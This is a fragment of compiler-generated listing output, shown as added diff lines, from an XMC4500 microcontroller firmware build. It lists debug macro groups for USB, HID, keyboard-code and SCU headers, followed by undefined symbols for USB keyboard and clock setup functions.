+                           .group:0000000000000000 wm4.newlib.h.18.1c9fedb6b3cd797cff253cc0fd593ef2
+                           .group:0000000000000000 wm4.ieeefp.h.77.c88535c35f465c05b101960cf0179075
+                           .group:0000000000000000 wm4.features.h.22.026edb2397769f4ae13f35900dbdb560
+                           .group:0000000000000000 wm4.config.h.224.c701144a7b0518c6ee9b9b5465b79f81
+                           .group:0000000000000000 wm4._ansi.h.31.de524f58584151836e90d8620a16f8e8
+                           .group:0000000000000000 wm4.stddef.h.39.27677723d43e5b5a7afdf8d798429f1d
+                           .group:0000000000000000 wm4._types.h.20.dd0d04dca3800a0d2a6129b87f3adbb2
+                           .group:0000000000000000 wm4.stddef.h.155.3588ebfdd1e8c7ede80509bb9c3b8009
+                           .group:0000000000000000 wm4._default_types.h.6.959254cf5f09734ea7516c89e8bb21bd
+                           .group:0000000000000000 wm4._types.h.127.34941de1b2539d59d5cac00e0dd27a45
+                           .group:0000000000000000 wm4.reent.h.17.e292bf8b0bec6c96e131a54347145a30
+                           .group:0000000000000000 wm4.lock.h.2.1461d1fff82dffe8bfddc23307f6484f
+                           .group:0000000000000000 wm4.reent.h.77.dcd6129ff07fe81bd5636db29abe53b2
+                           .group:0000000000000000 wm4.cdefs.h.49.a54b2d5c07711bc7320a3fea9f12cb56
+                           .group:0000000000000000 wm4.string.h.15.dab3980bf35408a4c507182805e2de3a
+                           .group:0000000000000000 wm4.stddef.h.155.ba788add86a0e365f264484f110c3c29
+                           .group:0000000000000000 wm4._intsup.h.10.48bafbb683905c4daa4565a85aeeb264
+                           .group:0000000000000000 wm4._stdint.h.10.c24fa3af3bc1706662bb5593a907e841
+                           .group:0000000000000000 wm4.stdint.h.23.d53047a68f4a85177f80b422d52785ed
+                           .group:0000000000000000 wm4.stdbool.h.29.07dce69c3b78884144b7f7bd19483461
+                           .group:0000000000000000 wm4.xmc_device.h.61.ba2d082e12f51240746cffdd60d42b81
+                           .group:0000000000000000 wm4.XMC4500.h.55.9aa45b9b5790506b2dcb963e4e7adeaf
+                           .group:0000000000000000 wm4.core_cm4.h.32.6c6eb1c8daeca23ce7ba79c8e8120d52
+                           .group:0000000000000000 wm4.cmsis_gcc.h.26.91b63349961c35637933e4fba51b867b
+                           .group:0000000000000000 wm4.core_cm4.h.172.fdd5a388a160bb6ff767b7d7ee212268
+                           .group:0000000000000000 wm4.system_XMC4500.h.42.99124977c10ca8844a71949adbeabd70
+                           .group:0000000000000000 wm4.XMC4500.h.208.b340195df97f067735c4c769ba59985a
+                           .group:0000000000000000 wm4.xmc_device.h.1460.8860499b404961ffcfbb8d1fefcb2146
+                           .group:0000000000000000 wm4.xmc_common.h.92.3f4336a80569affab05a81145b87c2fc
+                           .group:0000000000000000 wm4.xmc_gpio.h.97.fa6a2e1be6030a75d960293cc3bbbd6b
+                           .group:0000000000000000 wm4.xmc4_gpio_map.h.74.66e9110cf801b78826ef5354da51c32f
+                           .group:0000000000000000 wm4.xmc4_gpio.h.79.ce6c49508b5a7769c66e7e3c21dcdfe4
+                           .group:0000000000000000 wm4.USB.h.376.cfdb9ecb25c70fec676f585dede264a7
+                           .group:0000000000000000 wm4.Common.h.60.c2f00e237f5994003db83c2422602b22
+                           .group:0000000000000000 wm4.BoardTypes.h.52.ca64813ccee737bcc2115eab5e075fdb
+                           .group:0000000000000000 wm4.CompilerSpecific.h.55.4a5e5ff77cd35e49c89cf2115251aee0
+                           .group:0000000000000000 wm4.Attributes.h.56.73b3ee26b0836c2dec569a5fa6f1b355
+                           .group:0000000000000000 wm4.Endianness.h.57.3ac00c5468f4b91b806a0e6dba047e9c
+                           .group:0000000000000000 wm4.Common.h.105.4b937a9cc9dcdb26c3f07541b0b763a8
+                           .group:0000000000000000 wm4.USBController.h.49.cbfc73805155b6fff6267400af3f4eec
+                           .group:0000000000000000 wm4.stdlib.h.13.4ed386f5c1a80d71e72172885d946ef2
+                           .group:0000000000000000 wm4.alloca.h.8.dfc0c703c47ec3e69746825b17d9e66d
+                           .group:0000000000000000 wm4.stdlib.h.56.f4862cfbf4363a1db01842d5bdf72c18
+                           .group:0000000000000000 wm4.xmc_usbd_regs.h.80.57c6c85fa0ecbc9f8327ce445aebb9bc
+                           .group:0000000000000000 wm4.xmc4_scu.h.83.0449f5880ac071460ec1a8072311ea51
+                           .group:0000000000000000 wm4.xmc_usbd.h.122.ce57a9e6a9da48ee33ece02813c49593
+                           .group:0000000000000000 wm4.USBController_XMC4000.h.71.902f2653e09cb8b25245faa82cc6b907
+                           .group:0000000000000000 wm4.StdDescriptors.h.73.7d17e8be7a73b855fc0f8827303b7597
+                           .group:0000000000000000 wm4.Endpoint.h.73.3734de3e84ab23fb43d81f41fba620ec
+                           .group:0000000000000000 wm4.Device_XMC4000.h.86.6803bdd99d84e764a570256c87a24d0a
+                           .group:0000000000000000 wm4.StdRequestType.h.50.461dce94a3ee1fa9ff31ec5f28bd9699
+                           .group:0000000000000000 wm4.ConfigDescriptors.h.51.0d67ebf453774188abf5a503ba8f6735
+                           .group:0000000000000000 wm4.CDCClass.h.61.0d41ba255f7ce6f076fd610d8396dd1f
+                           .group:0000000000000000 wm4.CDCClassCommon.h.72.14ca578d8547e19a8a0c0d2d328483bd
+                           .group:0000000000000000 wm4.stdio.h.27.3fc80220048df77954e38daec3bb9670
+                           .group:0000000000000000 wm4.stdarg.h.34.3a23a216c0c293b3d2ea2e89281481e6
+                           .group:0000000000000000 wm4.types.h.40.8b6acba56cefbb11746718204edc8f5e
+                           .group:0000000000000000 wm4._endian.h.31.65a10590763c3dde1ac4a7f66d7d4891
+                           .group:0000000000000000 wm4.endian.h.9.49f3a4695c1b61e8a0808de3c4a106cb
+                           .group:0000000000000000 wm4._timeval.h.32.bec3221fa7a9bb0bdde696c9c57e47d2
+                           .group:0000000000000000 wm4.timespec.h.41.d855182eb0e690443ab8651bcedca6e1
+                           .group:0000000000000000 wm4.select.h.19.40cd3f2bfc456b193b790c2754690ebf
+                           .group:0000000000000000 wm4.types.h.51.5571ec98f267d17d3c670b7a3ba33afa
+                           .group:0000000000000000 wm4.sched.h.22.c60982713a5c428609783c78f9c78d95
+                           .group:0000000000000000 wm4._pthreadtypes.h.36.fcee9961c35163dde6267ef772ad1972
+                           .group:0000000000000000 wm4.stdio.h.2.4aa87247282eca6c8f36f9de33d8df1a
+                           .group:0000000000000000 wm4.stdio.h.81.932d0c162786b883f622b8d05c120c78
+                           .group:0000000000000000 wm4.HIDClass.h.62.6bb32c59177b21a83b8e65c5a1b0a615
+                           .group:0000000000000000 wm4.HIDReportData.h.47.f13f4956396e0bec70835fe634fcc24d
+                           .group:0000000000000000 wm4.HIDParser.h.88.4b86fe94cb8d01713592cdd0391b606b
+                           .group:0000000000000000 wm4.HIDClassCommon.h.71.a60cdf9d7cd69289f43dde215b509193
+                           .group:0000000000000000 wm4.MassStorageClass.h.61.e9235f3bd090b77f36343f082ef93107
+                           .group:0000000000000000 wm4.MassStorageClassCommon.h.51.6aefecf288eb3c3c6c9bde61e26dd765
+                           .group:0000000000000000 wm4.Descriptors.h.37.a9c2e3eb1c5646a4a3911d89f91c5fab
+                           .group:0000000000000000 wm4.german_keyboardCodes.h.2.e1b4448076427773e95ef41c8020de97
+
+UNDEFINED SYMBOLS
+memcpy
+XMC_GPIO_SetMode
+USB_Init
+HID_Device_USBTask
+Keyboard_HID_Interface
+XMC_SCU_CLOCK_Init
+XMC_SCU_CLOCK_EnableUsbPll
+XMC_SCU_CLOCK_StartUsbPll
+XMC_SCU_CLOCK_SetUsbClockDivider
+XMC_SCU_CLOCK_SetUsbClockSource
+XMC_SCU_CLOCK_EnableClock
+SystemCoreClockUpdate
